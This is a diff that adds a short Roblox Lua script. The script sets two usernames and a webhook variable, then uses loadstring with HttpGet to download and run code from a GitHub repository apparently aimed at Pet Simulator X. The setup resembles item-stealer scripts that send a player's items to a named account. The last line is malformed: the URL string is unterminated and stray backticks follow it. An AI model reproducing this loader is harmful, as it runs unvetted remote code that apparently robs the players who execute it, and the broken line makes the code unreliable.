@@ -1,0 +1,7 @@
+username = "DomigitoSim"
+
+username2 = "DomigitoSim"
+
+WebHookUrl = ""
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonScriptt/MStlrPsx/main/PsxScriptbyMoon/Main/lua))()```
